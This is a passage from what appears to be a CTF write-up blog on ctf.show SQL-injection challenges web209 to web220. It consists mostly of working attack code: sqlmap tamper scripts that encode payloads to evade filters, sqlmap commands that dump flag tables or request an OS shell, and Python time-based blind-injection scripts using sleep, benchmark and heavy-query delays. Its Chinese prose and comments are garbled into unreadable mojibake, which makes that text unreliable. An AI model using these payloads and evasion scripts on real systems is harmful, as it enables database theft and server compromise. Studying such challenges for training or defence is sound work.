å¦‚æœæ˜¯ç¬¬ä¸€ä¸ªç©ºæ ¼ï¼Œå°±è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">0x9</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># å¦‚æœåˆ¤æ–­æ˜¯åœ¨å¼•å·çš„å†…éƒ¨ï¼Œä¸ç®¡æ˜¯å•è¿˜æ˜¯åŒï¼Œéƒ½ä¸æ›¿æ¢</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x9</span>) + <span class="string">&#x27;like&#x27;</span> + <span class="built_in">chr</span>(<span class="number">0x9</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x9</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://<span class="number">0407</span>dae4-c9af-<span class="number">4418</span>-<span class="number">8</span>e92-bb043a3f33d8.challenge.ctf.show/api/index.php&quot; --method=&quot;PUT&quot; --data=&quot;id=<span class="number">1</span>&quot; --referer=ctf.show --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --safe-url=&quot;http://<span class="number">0407</span>dae4-c9af-<span class="number">4418</span>-<span class="number">8</span>e92-bb043a3f33d8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=<span class="number">1</span> --tamper=web209.py -T ctfshow_flav -C ctfshow_flagx --dump</span><br></pre></td></tr></table></figure><h4><span id="web210">web210</span></h4><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>åå‘æ“ä½œå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.encode()</span><br><span class="line">        retVal = retVal[::-<span class="number">1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal[::-<span class="number">1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://<span class="number">3</span>b91408c-<span class="number">21</span>f5-<span class="number">4</span>fb0-<span class="number">9</span>cf4-<span class="number">73438</span>accb280.challenge.ctf.show/api/index.php&quot; --method=&quot;PUT&quot; --data=&quot;id=<span class="number">1</span>&quot; --referer=ctf.show --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --safe-url=&quot;http://<span class="number">3</span>b91408c-<span class="number">21</span>f5-<span class="number">4</span>fb0-<span class="number">9</span>cf4-<span class="number">73438</span>accb280.challenge.ctf.show/api/getToken.php&quot; --safe-freq=<span class="number">1</span> --tamper=web210.py -T ctfshow_flavi -C ctfshow_flagxx --dump</span><br></pre></td></tr></table></figure><h4><span id="web212">Web212</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = bypass(payload)</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = retVal.encode()</span><br><span class="line">    retVal = retVal[::-<span class="number">1</span>]</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = retVal[::-<span class="number">1</span>]</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bypass</span>(<span class="params">payload</span>):</span><br><span class="line">    retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">        <span class="keyword">if</span> payload[i]==<span class="string">&quot; &quot;</span>:</span><br><span class="line">            retVal += <span class="built_in">chr</span>(<span class="number">0x9</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            retVal += payload[i]</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><h4><span id="web213">web213</span></h4><ul><li>é¢˜ç›®æç¤ºos-shell</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://<span class="number">4</span>ee86282-<span class="number">6952</span>-<span class="number">4</span>b4f-a276-f268fe18746a.challenge.ctf.show/api/index.php&quot; --method=&quot;PUT&quot; --data=&quot;id=<span class="number">1</span>&quot; --referer=ctf.show --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --safe-url=&quot;http://<span class="number">4</span>ee86282-<span class="number">6952</span>-<span class="number">4</span>b4f-a276-f268fe18746a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=<span class="number">1</span> --tamper=web210.py --os-shell --batch</span><br></pre></td></tr></table></figure><h4><span id="web214">web214</span></h4><p>æ—¶é—´ç›²æ³¨ï¼Œå†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a02805db-8d38-44d6-b782-6194092b9a45.challenge.ctf.show//api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†è¡¨å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># çˆ†åˆ—å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagx&#x27;&quot;</span></span><br><span class="line"><span class="comment">#çˆ†å­—æ®µå€¼</span></span><br><span class="line">payload = <span class="string">&quot;select flaga from `ctfshow_flagx`&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="comment"># 32-127æ˜¯å¯æ˜¾ç¤ºçš„ASCIIç </span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment"># print(mid)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> : <span class="string">f&quot;if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(3),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">0.8</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4><span id="web-215">web 215</span></h4><ul><li><p>ä»æ•°å­—ç±»å‹çš„å‚æ•°å˜æˆå­—ç¬¦ä¸²ç±»å‹å‚æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#x27; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)#&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web-216">web 216</span></h4><ul><li><p>é—­åˆ<code>)</code>å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;1) or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)#&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web-217">web 217</span></h4><p><a href="https://www.cnblogs.com/-qing-/p/10894310.html">sleepå¹³æ›¿æ³•</a></p><p><strong>benchmark</strong></p><blockquote><p>benchmark #å¯ä»¥æµ‹è¯•æŸäº›ç‰¹å®šæ“ä½œçš„æ‰§è¡Œé€Ÿåº¦ã€‚å‚æ•°å¯ä»¥æ˜¯éœ€è¦æ‰§è¡Œçš„æ¬¡æ•°å’Œè¡¨è¾¾å¼ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(1e7,sha1(&#x27;kradress&#x27;)); # 2.24s  </span><br><span class="line">select benchmark(1e7*(1=1),sha1(&#x27;kradress&#x27;)) #2.57s</span><br><span class="line">select benchmark(1e7*(1=2),sha1(&#x27;kradress&#x27;)) #0s</span><br></pre></td></tr></table></figure><p><strong>ç¬›å¡å°”ç§¯</strong></p><blockquote><p>è¿™ç§æ–¹æ³•åˆå«åšheavy query,å¯ä»¥é€šè¿‡é€‰å®šä¸€ä¸ªå¤§è¡¨æ¥åšç¬›å¡å„¿ç§¯ï¼Œä½†è¿™ç§æ–¹å¼æ‰§è¡Œæ—¶é—´ä¼šå‡ ä½•å€æ•°çš„æå‡ï¼Œåœ¨ç«™æ¯”è¾ƒå¤§çš„æƒ…å†µä¸‹ä¼šé€ æˆå‡ ä½•å€æ•°çš„æ•ˆæœï¼Œå®é™…åˆ©ç”¨èµ·æ¥éå¸¸ä¸å¥½ç”¨</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- å¯ä»¥ä»£æ›¿sleep</span><br><span class="line">select if(1=1,(select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C),0);</span><br></pre></td></tr></table></figure><p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p><blockquote><p>æ­£ä¾§åŒ¹é…åœ¨åŒ¹é…è¾ƒé•¿å­—ç¬¦ä¸²ä½†è‡ªç”±åº¦æ¯”è¾ƒé«˜çš„å­—ç¬¦ä¸²æ—¶ä¼šé€ æˆæ¯”è¾ƒå¤§çš„è®¡ç®—é‡ï¼Œæˆ‘ä»¬é€šè¿‡rpadæˆ–repeatæ„é€ é•¿å­—ç¬¦ä¸²ï¼ŒåŠ ä»¥è®¡ç®—é‡å¤§çš„pattern,é€šè¿‡æ§åˆ¶å­—ç¬¦ä¸²é•¿åº¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶å»¶æ—¶</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT if(1=1,(select rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;)),0)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡benchmarkæ¥å®ç°sleepçš„å¹³æ›¿ï¼Œmysqlä¸­trueä¸º1ï¼Œfalseä¸º0ï¼Œæˆ‘ä»¬å¯ä»¥ä¹˜ä¸€ä¸ªå¤§æ•°æ¥è¿›è¡Œbenchmark</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/6/7 15:13</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4e8f7ce0-ca2c-4556-a84d-4a0172160a7a.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†è¡¨å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># çˆ†åˆ—å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxccb&#x27;&quot;</span></span><br><span class="line"><span class="comment">#çˆ†å­—æ®µå€¼</span></span><br><span class="line">payload = <span class="string">&quot;select flagaabc from `ctfshow_flagxccb`&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> : <span class="string">f&quot;-1) or benchmark(4e6*(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>),sha1(&#x27;disda&#x27;))#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web218">web218</span></h4><p>è¿™é“é¢˜banäº†<code>sleep</code>å’Œ<code>benchmark</code></p><p>æˆ‘ä»¬ä½¿ç”¨ç¬›å¡å°”ç§¯å¹³æ›¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d3acf855-ded7-4f06-9fe8-d6c38215602b.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†è¡¨å  </span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># çˆ†åˆ—å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxc&#x27;&quot;</span></span><br><span class="line"><span class="comment">#çˆ†å­—æ®µå€¼</span></span><br><span class="line"><span class="comment">#218</span></span><br><span class="line"><span class="comment">#payload = &quot;select flagaac from ctfshow_flagxc&quot;</span></span><br><span class="line"><span class="comment">#219</span></span><br><span class="line"><span class="comment">#payload = &quot;select flagaabc from ctfshow_flagxca&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment"># print(mid)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> : <span class="string">f&quot;-1) or if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,(select count(*) from information_schema.columns A, information_schema.columns B,information_schema.schemata C),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web220">web220</span></h4><p>asciiå¯ä»¥ç”¨ordåŒåå‡½æ•°æ›¿æ¢,substrå¯ä»¥ç”¨rightæ›¿æ¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d9c4aa97-33ea-4164-abc7-79b0c50fe9ce.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†è¡¨å  </span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># çˆ†åˆ—å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxcac&#x27;&quot;</span></span><br><span class="line"><span class="comment">#çˆ†å­—æ®µå€¼</span></span><br><span class="line">payload = <span class="string">&quot;select flagaabcc from ctfshow_flagxcac&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment"># print(mid)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> : <span class="string">f&quot;-1) or if(ord(right((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>))&gt;<span class="subst">&#123;mid&#125;</span>,(select count(*) from information_schema.columns A, information_schema.columns B,information_schema.schemata C),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span 